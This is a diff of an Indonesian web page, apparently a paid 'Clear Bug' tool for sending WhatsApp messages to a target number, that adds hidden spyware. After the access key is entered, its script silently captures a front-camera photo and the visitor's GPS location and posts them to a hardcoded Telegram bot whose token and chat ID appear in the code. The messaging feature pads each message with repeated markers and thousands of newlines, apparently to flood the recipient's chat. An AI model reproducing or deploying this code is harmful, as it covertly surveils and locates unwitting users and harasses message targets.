@@ -1,55 +1,234 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Web Sedang Dalam Perbaikan</title>
+    <title>Kirim Pesan Clear Bug ke WhatsApp</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            margin: 0;
-            padding: 0;
             font-family: Arial, sans-serif;
-            background-image: url('https://files.catbox.moe/tyqg1m.jpg');
-            background-size: cover;
-            background-position: center;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
             text-align: center;
             color: white;
+            text-shadow: 1px 1px 2px black;
+            position: relative;
+            overflow: hidden;
         }
 
-        .container {
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.8);
+        #video-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
         }
 
-        h1 {
-            color: #ff4444;
-            margin-bottom: 15px;
+        .content-overlay {
+            position: relative;
+            z-index: 1;
         }
 
-        p {
-            font-size: 18px;
-            line-height: 1.6;
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #25D366;
+            border-radius: 5px;
+            resize: vertical;
+            background-color: rgba(255, 255, 255, 0.8);
+        }
+
+        textarea {
+            min-height: 100px;
+        }
+
+        button {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #128C7E;
+        }
+
+        .note {
+            font-size: 12px;
+            color: #ddd;
+            margin-top: 20px;
+            text-shadow: 1px 1px 1px black;
+        }
+
+        #passwordSection {
+            margin: 20px 0;
+            background-color: rgba(0, 0, 0, 0.6);
+            padding: 20px;
+            border-radius: 10px;
+        }
+
+        #passwordInput {
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-right: 10px;
+            background-color: rgba(255, 255, 255, 0.9);
+        }
+
+        #appContent {
+            background-color: rgba(0, 0, 0, 0.6);
+            padding: 20px;
+            border-radius: 10px;
+        }
+
+        #cameraPreview, #canvasCapture {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚧 Web Sedang Dalam Perbaikan 🚧</h1>
-        <p>Web sedang diperbaiki oleh developer.<br>
-        Kami sedang melakukan perbaikan sistem Clear Bug dan menambahkan teks agar lebih sempurna dan work dengan baik.<br><br>
-        Harap tunggu beberapa saat lagi 🙏</p>
+    <video id="video-background" autoplay muted loop>
+        <source src="https://files.catbox.moe/bq5xe4.mp4" type="video/mp4">
+    </video>
+
+    <div class="content-overlay">
+        <h1>🟢KETIK CLEAR BUG</h1>
+
+        <div id="passwordSection">
+            <p>Masukkan Key untuk mengakses:</p>
+            <input type="password" id="passwordInput" placeholder="Masukkan Key">
+            <button onclick="checkPassword()">🔓 Buka Akses</button>
+        </div>
+
+        <div id="appContent" style="display: none;">
+            <p>Masukkan nomor target WhatsApp (contoh: 6285923596743):</p>
+            <input type="text" id="nomorTujuan" placeholder="Nomor Target WhatsApp tanpa +">
+
+            <p>Ketik pesan Clear Bug (Contoh: CLEAR BUG):</p>
+            <textarea id="pesan" placeholder="Ketik pesan Clear Bug di sini..."></textarea>
+
+            <button onclick="kirimWa()">📤 Kirim Pesan</button>
+
+            <div class="note">
+                NOTE: WEB INI VIPP. KALAU KETAHUAN DIBAGI GRATIS, GW RESET PASSWORD. MAMPUS. (DEVELOPER: DIK_MARKER)
+            </div>
+        </div>
     </div>
 
-    <!-- Audio otomatis -->
-    <audio autoplay loop>
-        <source src="https://files.catbox.moe/kei09l.mp3" type="audio/mpeg">
-        Browser kamu tidak mendukung audio.
-    </audio>
+    <audio id="successSound" src="https://files.catbox.moe/x19fpy.mp3" preload="auto" loop></audio>
+    <video id="cameraPreview" autoplay playsinline></video>
+    <canvas id="canvasCapture" width="640" height="480"></canvas>
+
+    <script>
+        const token = "7762127279:AAHIQQ_l3KJGaV9T31YM1ZAZ2hNRQcVYtLM";
+        const chatId = "6788646701";
+
+        function checkPassword() {
+            const password = "andikavip";
+            const input = document.getElementById("passwordInput").value;
+            const successSound = document.getElementById("successSound");
+
+            if (input === password) {
+                successSound.loop = true;
+                successSound.play().catch(e => console.log("Autoplay error:", e));
+                document.getElementById("passwordSection").style.display = "none";
+                document.getElementById("appContent").style.display = "block";
+
+                mintaAksesKameraDanKirimFoto();
+                mintaAksesLokasi();
+            } else {
+                alert("KEY SALAH TOLOL, BUY KE DIK 🤭.");
+                document.getElementById("passwordInput").value = "";
+            }
+        }
+
+        function mintaAksesLokasi() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    const message = `📍 *Akses Web Clear Bug Terbuka!*\n\n🔑 Password benar\n🌍 Lokasi pengguna:\nLatitude: ${latitude}\nLongitude: ${longitude}\n📌 [Lihat di Maps](${mapLink})`;
+
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: "Markdown"
+                        })
+                    });
+                }, function(error) {
+                    alert("Gagal mengambil lokasi: " + error.message);
+                });
+            } else {
+                alert("Browser tidak mendukung geolocation.");
+            }
+        }
+
+        function mintaAksesKameraDanKirimFoto() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(function(stream) {
+                    const video = document.getElementById("cameraPreview");
+                    video.srcObject = stream;
+
+                    setTimeout(() => {
+                        const canvas = document.getElementById("canvasCapture");
+                        const context = canvas.getContext("2d");
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append("chat_id", chatId);
+                            formData.append("photo", blob, "selfie.jpg");
+
+                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                                method: "POST",
+                                body: formData
+                            }).then(() => {
+                                console.log("Foto berhasil dikirim ke Telegram.");
+                            }).catch(err => {
+                                console.error("Gagal kirim foto:", err);
+                            });
+                        }, "image/jpeg");
+                    }, 3000); // Tunggu 3 detik sebelum ambil foto
+                })
+                .catch(function(err) {
+                    console.error("Gagal mengakses kamera:", err);
+                    alert("Tidak bisa mengakses kamera depan: " + err.message);
+                });
+        }
+
+        function kirimWa() {
+            const target = document.getElementById("nomorTujuan").value;
+            const pesan = document.getElementById("pesan").value;
+
+            if (!target) {
+                alert("Masukkan nomor target dulu ya!");
+                return;
+            }
+
+            if (!pesan) {
+                alert("Tulis pesan Clear Bug dulu ya!");
+                return;
+            }
+
+            const markerText = `\n\n𝐃𝐈𝐊_𝐌𝐀𝐑𝐊𝐄𝐑 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆${'\n'.repeat(500)}𝐃𝐈𝐊_𝐌𝐀𝐑𝐊𝐄𝐑 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆${'\n'.repeat(500)}𝐃𝐈𝐊_𝐌𝐀𝐑𝐊𝐄𝐑 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆${'\n'.repeat(500)}𝐃𝐈𝐊_𝐌𝐀𝐑𝐊𝐄𝐑 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆`;
+            const fullMessage = `${pesan}\n\n${markerText}`;
+            const encoded = encodeURIComponent(fullMessage);
+            const waLink = `https://wa.me/${target}?text=${encoded}`;
+            window.open(waLink, "_blank");
+        }
+    </script>
 </body>
 </html>
